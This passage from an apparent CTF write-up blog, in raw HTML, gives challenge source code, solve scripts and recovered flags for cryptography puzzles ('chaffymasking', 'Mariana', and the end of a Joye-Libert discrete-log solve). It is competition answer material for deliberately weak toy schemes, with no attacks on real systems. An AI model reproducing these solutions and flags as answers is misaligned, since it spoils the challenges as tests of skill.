class="line">            ps.append(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">ps = [<span class="number">95553042292789874700903619680433024548766742921219411688127033417325711720449</span>, <span class="number">97465437469424293753701354915129486026538223057283543854406758660981557035009</span>, <span class="number">93874713528665486923249914973058040339864593786031505872542450888415920521217</span>, <span class="number">102692834149450074746796719675178138708750556898826303720138266777336682643457</span>]</span><br><span class="line">ss = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> PUBKEYS]</span><br><span class="line">ms = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    c = ENCS[i]</span><br><span class="line">    p = ps[i]</span><br><span class="line">    s = ss[i]</span><br><span class="line">    p0 = (p-<span class="number">1</span>)//(<span class="number">2</span>**k)</span><br><span class="line">    cp0 = <span class="built_in">pow</span>(c,p0,p)</span><br><span class="line">    mp0 = discrete_log(mod(cp0,p),mod(s,p))</span><br><span class="line">    m = mp0//p0</span><br><span class="line">    ms.append(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(ms))</span><br><span class="line"><span class="built_in">print</span>(ms)</span><br><span class="line"></span><br><span class="line"><span class="comment"># N3w_CTF_nEW_Joye_Libert_CrYpt0_5</span></span><br></pre></td></tr></table></figure><h2 id="chaffymasking"><a href="#chaffymasking" class="headerlink" title="chaffymasking"></a>chaffymasking</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">die</span>(<span class="params">*args</span>):</span><br><span class="line">pr(*args)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">*args</span>):</span><br><span class="line">s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>(): </span><br><span class="line"><span class="keyword">return</span> sys.stdin.buffer.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">inp, length</span>):</span><br><span class="line">result = inp + os.urandom(length - <span class="built_in">len</span>(inp))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_xor</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bytes</span>(_a ^ _b <span class="keyword">for</span> _a,_b <span class="keyword">in</span> <span class="built_in">zip</span>(a,b)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chaffy_mask</span>(<span class="params">salt, LTC, m, n</span>):</span><br><span class="line">q = n ** <span class="number">2</span></span><br><span class="line">half1_salt = salt[:m // <span class="number">8</span>]</span><br><span class="line">half2_salt = salt[m // <span class="number">8</span>:]</span><br><span class="line">xor_salts = <span class="built_in">int</span>.from_bytes(byte_xor(half1_salt, half2_salt), <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> xor_salts == <span class="number">0</span>:</span><br><span class="line">half1_salt = byte_xor(half1_salt, os.urandom(m))</span><br><span class="line">half1_binStr = <span class="string">&quot;&#123;:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(half1_salt.<span class="built_in">hex</span>(),<span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(half1_binStr) &lt; m):</span><br><span class="line">half1_binStr = <span class="string">&quot;0&quot;</span> * (m - <span class="built_in">len</span>(half1_binStr)%m) + half1_binStr</span><br><span class="line">half2_binStr = <span class="string">&quot;&#123;:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(half2_salt.<span class="built_in">hex</span>(),<span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(half2_binStr) &lt; m):</span><br><span class="line">half2_binStr = <span class="string">&quot;0&quot;</span> * (m - <span class="built_in">len</span>(half2_binStr)%m) + half2_binStr</span><br><span class="line"></span><br><span class="line">vec_1 = np.array(<span class="built_in">list</span>(half1_binStr), dtype=<span class="built_in">int</span>)</span><br><span class="line">vec_1 = np.reshape(vec_1, (m,<span class="number">1</span>))</span><br><span class="line">vec_2 = np.array(<span class="built_in">list</span>(half2_binStr), dtype=<span class="built_in">int</span>)</span><br><span class="line">vec_2 = np.reshape(vec_2, (m,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">out_1 = LTC.dot(vec_1) % q</span><br><span class="line">out_2 = LTC.dot(vec_2) % q</span><br><span class="line"></span><br><span class="line">flag_vector = np.array([<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> FLAG])</span><br><span class="line">flag_vector = np.reshape(flag_vector, (n,<span class="number">1</span>))</span><br><span class="line">masked_flag = (flag_vector ^ out_1 ^ out_2) % <span class="number">256</span></span><br><span class="line">masked_flag = np.reshape(masked_flag, (n,))</span><br><span class="line">masked_flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> masked_flag])</span><br><span class="line"><span class="keyword">return</span> masked_flag.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">border = <span class="string">&quot;|&quot;</span></span><br><span class="line">pr(border*<span class="number">72</span>)</span><br><span class="line">pr(border, <span class="string">&quot; Welcome to chaffymask combat, we implemented a masking method to   &quot;</span>, border)</span><br><span class="line">pr(border, <span class="string">&quot; hide our secret. Masking is done by your 1024 bit input salt. Also &quot;</span>, border)</span><br><span class="line">pr(border, <span class="string">&quot; I noticed that there is a flaw in my method. Can you abuse it and  &quot;</span>, border)</span><br><span class="line">pr(border, <span class="string">&quot; get the flag? In each step you should send salt and get the mask.  &quot;</span>, border)</span><br><span class="line">pr(border*<span class="number">72</span>)</span><br><span class="line"></span><br><span class="line">m, n = <span class="number">512</span>, <span class="number">64</span> </span><br><span class="line">IVK = [</span><br><span class="line"><span class="number">3826</span>, <span class="number">476</span>, <span class="number">3667</span>, <span class="number">2233</span>, <span class="number">1239</span>, <span class="number">1166</span>, <span class="number">2119</span>, <span class="number">2559</span>, <span class="number">2376</span>, <span class="number">1208</span>, <span class="number">2165</span>, <span class="number">2897</span>, <span class="number">830</span>, <span class="number">529</span>, <span class="number">346</span>, <span class="number">150</span>, <span class="number">2188</span>, <span class="number">4025</span>, </span><br><span class="line"><span class="number">3667</span>, <span class="number">1829</span>, <span class="number">3987</span>, <span class="number">952</span>, <span class="number">3860</span>, <span class="number">2574</span>, <span class="number">959</span>, <span class="number">1394</span>, <span class="number">1481</span>, <span class="number">2822</span>, <span class="number">3794</span>, <span class="number">2950</span>, <span class="number">1190</span>, <span class="number">777</span>, <span class="number">604</span>, <span class="number">82</span>, <span class="number">49</span>, <span class="number">710</span>, <span class="number">1765</span>, </span><br><span class="line"><span class="number">3752</span>, <span class="number">2970</span>, <span class="number">952</span>, <span class="number">803</span>, <span class="number">873</span>, <span class="number">2647</span>, <span class="number">2643</span>, <span class="number">1096</span>, <span class="number">1202</span>, <span class="number">2236</span>, <span class="number">1492</span>, <span class="number">3372</span>, <span class="number">2106</span>, <span class="number">1868</span>, <span class="number">535</span>, <span class="number">161</span>, <span class="number">3143</span>, <span class="number">3370</span>, </span><br><span class="line"><span class="number">1</span>, <span class="number">1643</span>, <span class="number">2147</span>, <span class="number">2368</span>, <span class="number">3961</span>, <span class="number">1339</span>, <span class="number">552</span>, <span class="number">2641</span>, <span class="number">3222</span>, <span class="number">2505</span>, <span class="number">3449</span>, <span class="number">1540</span>, <span class="number">2024</span>, <span class="number">618</span>, <span class="number">1904</span>, <span class="number">314</span>, <span class="number">1306</span>, <span class="number">3173</span>, </span><br><span class="line"><span class="number">4040</span>, <span class="number">1488</span>, <span class="number">1339</span>, <span class="number">2545</span>, <span class="number">2167</span>, <span class="number">394</span>, <span class="number">46</span>, <span class="number">3169</span>, <span class="number">897</span>, <span class="number">4085</span>, <span class="number">4067</span>, <span class="number">3461</span>, <span class="number">3444</span>, <span class="number">118</span>, <span class="number">3185</span>, <span class="number">2267</span>, <span class="number">3239</span>, <span class="number">3612</span>, </span><br><span class="line"><span class="number">2775</span>, <span class="number">580</span>, <span class="number">3579</span>, <span class="number">3623</span>, <span class="number">1721</span>, <span class="number">189</span>, <span class="number">650</span>, <span class="number">2755</span>, <span class="number">1434</span>, <span class="number">35</span>, <span class="number">3167</span>, <span class="number">323</span>, <span class="number">589</span>, <span class="number">3410</span>, <span class="number">652</span>, <span class="number">2746</span>, <span class="number">2787</span>, <span class="number">3665</span>, <span class="number">828</span>, </span><br><span class="line"><span class="number">3200</span>, <span class="number">1450</span>, <span class="number">3147</span>, <span class="number">720</span>, <span class="number">3741</span>, <span class="number">1055</span>, <span class="number">505</span>, <span class="number">2929</span>, <span class="number">1423</span>, <span class="number">3629</span>, <span class="number">3</span>, <span class="number">1269</span>, <span class="number">4066</span>, <span class="number">125</span>, <span class="number">2432</span>, <span class="number">3306</span>, <span class="number">4015</span>, <span class="number">2350</span>, </span><br><span class="line"><span class="number">2154</span>, <span class="number">2623</span>, <span class="number">1304</span>, <span class="number">493</span>, <span class="number">763</span>, <span class="number">1765</span>, <span class="number">2608</span>, <span class="number">695</span>, <span class="number">30</span>, <span class="number">2462</span>, <span class="number">294</span>, <span class="number">3656</span>, <span class="number">3231</span>, <span class="number">3647</span>, <span class="number">3776</span>, <span class="number">3457</span>, <span class="number">2285</span>, <span class="number">2992</span>, </span><br><span class="line"><span class="number">3997</span>, <span class="number">603</span>, <span class="number">2342</span>, <span class="number">2283</span>, <span class="number">3029</span>, <span class="number">3299</span>, <span class="number">1690</span>, <span class="number">3281</span>, <span class="number">3568</span>, <span class="number">1927</span>, <span class="number">2909</span>, <span class="number">1797</span>, <span class="number">1675</span>, <span class="number">3245</span>, <span class="number">2604</span>, <span class="number">1272</span>, <span class="number">1146</span>, </span><br><span class="line"><span class="number">3301</span>, <span class="number">13</span>, <span class="number">3712</span>, <span class="number">2691</span>, <span class="number">1097</span>, <span class="number">1396</span>, <span class="number">3694</span>, <span class="number">3866</span>, <span class="number">2066</span>, <span class="number">1946</span>, <span class="number">3476</span>, <span class="number">1182</span>, <span class="number">3409</span>, <span class="number">3510</span>, <span class="number">2920</span>, <span class="number">2743</span>, <span class="number">1126</span>, <span class="number">2154</span>, </span><br><span class="line"><span class="number">3447</span>, <span class="number">1442</span>, <span class="number">2021</span>, <span class="number">1748</span>, <span class="number">1075</span>, <span class="number">1439</span>, <span class="number">3932</span>, <span class="number">3438</span>, <span class="number">781</span>, <span class="number">1478</span>, <span class="number">1708</span>, <span class="number">461</span>, <span class="number">50</span>, <span class="number">1881</span>, <span class="number">1353</span>, <span class="number">2959</span>, <span class="number">1225</span>, <span class="number">1923</span>, </span><br><span class="line"><span class="number">1414</span>, <span class="number">4046</span>, <span class="number">3416</span>, <span class="number">2845</span>, <span class="number">1498</span>, <span class="number">4036</span>, <span class="number">3899</span>, <span class="number">3878</span>, <span class="number">766</span>, <span class="number">3975</span>, <span class="number">1355</span>, <span class="number">2602</span>, <span class="number">3588</span>, <span class="number">3508</span>, <span class="number">3660</span>, <span class="number">3237</span>, <span class="number">3018</span>, </span><br><span class="line"><span class="number">1619</span>, <span class="number">2797</span>, <span class="number">1823</span>, <span class="number">1185</span>, <span class="number">3225</span>, <span class="number">1270</span>, <span class="number">87</span>, <span class="number">979</span>, <span class="number">124</span>, <span class="number">1239</span>, <span class="number">1763</span>, <span class="number">2672</span>, <span class="number">3951</span>, <span class="number">984</span>, <span class="number">869</span>, <span class="number">3897</span>, <span class="number">327</span>, <span class="number">912</span>, <span class="number">1826</span>, </span><br><span class="line"><span class="number">3354</span>, <span class="number">1485</span>, <span class="number">2942</span>, <span class="number">746</span>, <span class="number">833</span>, <span class="number">3968</span>, <span class="number">1437</span>, <span class="number">3590</span>, <span class="number">2151</span>, <span class="number">1523</span>, <span class="number">98</span>, <span class="number">164</span>, <span class="number">3119</span>, <span class="number">1161</span>, <span class="number">3804</span>, <span class="number">1850</span>, <span class="number">3027</span>, <span class="number">1715</span>, </span><br><span class="line"><span class="number">3847</span>, <span class="number">2407</span>, <span class="number">2549</span>, <span class="number">467</span>, <span class="number">2029</span>, <span class="number">2808</span>, <span class="number">1782</span>, <span class="number">1134</span>, <span class="number">1953</span>, <span class="number">47</span>, <span class="number">1406</span>, <span class="number">3828</span>, <span class="number">1277</span>, <span class="number">2864</span>, <span class="number">2392</span>, <span class="number">3458</span>, <span class="number">2877</span>, <span class="number">1851</span>, </span><br><span class="line"><span class="number">1033</span>, <span class="number">798</span>, <span class="number">2187</span>, <span class="number">54</span>, <span class="number">2800</span>, <span class="number">890</span>, <span class="number">3759</span>, <span class="number">4085</span>, <span class="number">3801</span>, <span class="number">3128</span>, <span class="number">3788</span>, <span class="number">2926</span>, <span class="number">1983</span>, <span class="number">55</span>, <span class="number">2173</span>, <span class="number">2579</span>, <span class="number">904</span>, <span class="number">1019</span>, </span><br><span class="line"><span class="number">2108</span>, <span class="number">3054</span>, <span class="number">284</span>, <span class="number">2428</span>, <span class="number">2371</span>, <span class="number">2045</span>, <span class="number">907</span>, <span class="number">1379</span>, <span class="number">2367</span>, <span class="number">351</span>, <span class="number">3678</span>, <span class="number">1087</span>, <span class="number">2821</span>, <span class="number">152</span>, <span class="number">1783</span>, <span class="number">1993</span>, <span class="number">3183</span>, <span class="number">1317</span>, </span><br><span class="line"><span class="number">2726</span>, <span class="number">2609</span>, <span class="number">1255</span>, <span class="number">144</span>, <span class="number">2415</span>, <span class="number">2498</span>, <span class="number">721</span>, <span class="number">668</span>, <span class="number">355</span>, <span class="number">94</span>, <span class="number">1997</span>, <span class="number">2609</span>, <span class="number">1945</span>, <span class="number">3011</span>, <span class="number">2405</span>, <span class="number">713</span>, <span class="number">2811</span>, <span class="number">4076</span>, </span><br><span class="line"><span class="number">2367</span>, <span class="number">3218</span>, <span class="number">1353</span>, <span class="number">3957</span>, <span class="number">2056</span>, <span class="number">881</span>, <span class="number">3420</span>, <span class="number">1994</span>, <span class="number">1329</span>, <span class="number">892</span>, <span class="number">1577</span>, <span class="number">688</span>, <span class="number">134</span>, <span class="number">371</span>, <span class="number">774</span>, <span class="number">3855</span>, <span class="number">1461</span>, <span class="number">1536</span>, </span><br><span class="line"><span class="number">1824</span>, <span class="number">1164</span>, <span class="number">1675</span>, <span class="number">46</span>, <span class="number">1267</span>, <span class="number">3652</span>, <span class="number">67</span>, <span class="number">3816</span>, <span class="number">3169</span>, <span class="number">2116</span>, <span class="number">3930</span>, <span class="number">2979</span>, <span class="number">3166</span>, <span class="number">3944</span>, <span class="number">2252</span>, <span class="number">2988</span>, <span class="number">34</span>, <span class="number">873</span>, </span><br><span class="line"><span class="number">1643</span>, <span class="number">1159</span>, <span class="number">2822</span>, <span class="number">1235</span>, <span class="number">2604</span>, <span class="number">888</span>, <span class="number">2036</span>, <span class="number">3053</span>, <span class="number">971</span>, <span class="number">1585</span>, <span class="number">2439</span>, <span class="number">2599</span>, <span class="number">1447</span>, <span class="number">1773</span>, <span class="number">984</span>, <span class="number">261</span>, <span class="number">3233</span>, <span class="number">2861</span>, </span><br><span class="line"><span class="number">618</span>, <span class="number">465</span>, <span class="number">3016</span>, <span class="number">3081</span>, <span class="number">1230</span>, <span class="number">1027</span>, <span class="number">3177</span>, <span class="number">459</span>, <span class="number">3041</span>, <span class="number">513</span>, <span class="number">1505</span>, <span class="number">3410</span>, <span class="number">3167</span>, <span class="number">177</span>, <span class="number">958</span>, <span class="number">2118</span>, <span class="number">326</span>, <span class="number">31</span>, <span class="number">2663</span>, </span><br><span class="line"><span class="number">2026</span>, <span class="number">2549</span>, <span class="number">3026</span>, <span class="number">2364</span>, <span class="number">1540</span>, <span class="number">3236</span>, <span class="number">2644</span>, <span class="number">4050</span>, <span class="number">735</span>, <span class="number">280</span>, <span class="number">798</span>, <span class="number">169</span>, <span class="number">3808</span>, <span class="number">2384</span>, <span class="number">3497</span>, <span class="number">1759</span>, <span class="number">2415</span>, <span class="number">3444</span>, </span><br><span class="line"><span class="number">1562</span>, <span class="number">3472</span>, <span class="number">1151</span>, <span class="number">1984</span>, <span class="number">2454</span>, <span class="number">3167</span>, <span class="number">1538</span>, <span class="number">941</span>, <span class="number">1561</span>, <span class="number">3071</span>, <span class="number">845</span>, <span class="number">2824</span>, <span class="number">58</span>, <span class="number">1467</span>, <span class="number">3807</span>, <span class="number">2191</span>, <span class="number">1858</span>, <span class="number">106</span>, </span><br><span class="line"><span class="number">3847</span>, <span class="number">1326</span>, <span class="number">3868</span>, <span class="number">2787</span>, <span class="number">1624</span>, <span class="number">795</span>, <span class="number">3214</span>, <span class="number">1932</span>, <span class="number">3496</span>, <span class="number">457</span>, <span class="number">2595</span>, <span class="number">3043</span>, <span class="number">772</span>, <span class="number">2436</span>, <span class="number">2160</span>, <span class="number">3428</span>, <span class="number">2005</span>, <span class="number">2597</span>, </span><br><span class="line"><span class="number">1932</span>, <span class="number">101</span>, <span class="number">3528</span>, <span class="number">1698</span>, <span class="number">3663</span>, <span class="number">900</span>, <span class="number">3298</span>, <span class="number">1872</span>, <span class="number">1179</span>, <span class="number">3987</span>, <span class="number">3695</span>, <span class="number">3561</span>, <span class="number">1762</span>, <span class="number">3785</span>, <span class="number">3005</span>, <span class="number">2574</span>, <span class="number">6</span>, <span class="number">1524</span>, </span><br><span class="line"><span class="number">2738</span>, <span class="number">1753</span>, <span class="number">2350</span>, <span class="number">558</span>, <span class="number">800</span>, <span class="number">3782</span>, <span class="number">722</span>, <span class="number">886</span>, <span class="number">2176</span>, <span class="number">3050</span>, <span class="number">221</span>, <span class="number">1925</span>, <span class="number">564</span>, <span class="number">1271</span>, <span class="number">2535</span>, <span class="number">3113</span>, <span class="number">1310</span>, <span class="number">2098</span>, </span><br><span class="line"><span class="number">3011</span>, <span class="number">964</span>, <span class="number">3281</span>, <span class="number">6</span>, <span class="number">1326</span>, <span class="number">741</span>, <span class="number">189</span>, <span class="number">2632</span>, <span class="number">373</span>, <span class="number">1176</span>, <span class="number">548</span>, <span class="number">64</span>, <span class="number">1445</span>, <span class="number">2376</span>, <span class="number">1524</span>, <span class="number">2690</span>, <span class="number">1316</span>, <span class="number">2304</span>, <span class="number">1336</span>, </span><br><span class="line"><span class="number">2257</span>, <span class="number">3227</span>, <span class="number">2542</span>, <span class="number">3911</span>, <span class="number">3460</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">LTC = np.zeros([n, m], dtype=(<span class="built_in">int</span>))</span><br><span class="line">LTC[<span class="number">0</span>,:] = IVK</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m // n + <span class="number">1</span>):</span><br><span class="line">LTC[i,j*n:(j+<span class="number">1</span>)*n] = np.roll(IVK[j*n:(j+<span class="number">1</span>)*n], i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">pr(border, <span class="string">&quot;Give me your salt: &quot;</span>)</span><br><span class="line">SALT = sc()[:-<span class="number">1</span>]</span><br><span class="line">SALT = pad(SALT, m // <span class="number">4</span>)</span><br><span class="line">MASKED_FLAG = chaffy_mask(SALT, LTC, m, n)</span><br><span class="line">pr(border, <span class="string">f&#x27;masked_flag = <span class="subst">&#123;MASKED_FLAG&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>看着很复杂 其实前面全部可以照搬过来 最后得到flag xor回去即可…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">out_1 = LTC.dot(vec_1) % q</span><br><span class="line">out_2 = LTC.dot(vec_2) % q</span><br><span class="line"></span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    enc.append(<span class="built_in">int</span>(masked_flag[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">enc_vec = np.reshape(enc,(n,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">flagV = (enc_vec^out_1^out_2) % <span class="number">256</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">bytes</span>(<span class="built_in">list</span>(flagV.reshape(-<span class="number">1</span>)))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># ASIS&#123;Lattice_based_hash_collision_it_was_sooooooooooooooo_easY!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Mariana"><a href="#Mariana" class="headerlink" title="Mariana"></a>Mariana</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">die</span>(<span class="params">*args</span>):</span><br><span class="line">pr(*args)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">*args</span>):</span><br><span class="line">s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>():</span><br><span class="line"><span class="keyword">return</span> sys.stdin.buffer.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">border = <span class="string">&quot;|&quot;</span></span><br><span class="line">pr(border*<span class="number">72</span>)</span><br><span class="line">pr(border, <span class="string">&quot;Welcome to MARIANA cryptography battle, the mission is solving super&quot;</span>, border)</span><br><span class="line">pr(border, <span class="string">&quot;hard special DLP problem in real world, are you ready to fight?     &quot;</span>, border)</span><br><span class="line">pr(border*<span class="number">72</span>)</span><br><span class="line"></span><br><span class="line">NBIT = <span class="number">32</span></span><br><span class="line">STEP = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">pr(border, <span class="string">&quot;In each step solve the given equation and send the solution for x.  &quot;</span>, border)</span><br><span class="line">c = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> c &lt;= STEP:</span><br><span class="line">nbit = NBIT * c</span><br><span class="line">p = getPrime(nbit)</span><br><span class="line">g = getRandomRange(<span class="number">3</span>, p)</span><br><span class="line">pr(border, <span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">pr(border, <span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line">pr(border, <span class="string">&#x27;Send the solution x = &#x27;</span>)</span><br><span class="line">ans = sc()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">x = <span class="built_in">int</span>(ans)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">die(border, <span class="string">&#x27;Given number is not integer!&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> x &gt;= p:</span><br><span class="line">die(border, <span class="string">&quot;Kidding me!? Your solution must be smaller than p :P&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pow</span>(g, x, p) - x) % p == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> c == STEP:</span><br><span class="line">die(border, <span class="string">f&quot;Congratz! the flag is: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">pr(border, <span class="string">&quot;Good job, try to solve the next level!&quot;</span>)</span><br><span class="line">c += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">die(border, <span class="string">&quot;Try harder and smarter to find the solution!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>az send x&#x3D; -(p-1)即可<br>因为 <code>g^(-(p-1)) === (g^(p-1))^(-1) === 1 === 1-p === -(p-1) mod p</code></p><h1 id="ImaginaryCTF-2023"><a href="#ImaginaryCTF-2023" class="headerlink" title="ImaginaryCTF 2023"></a>ImaginaryCTF 2023</h1><h2 id="sus"><a href="#sus" class="headerlink" title="sus"></a>sus</h2><figure class="highlight python"><table><tr><td 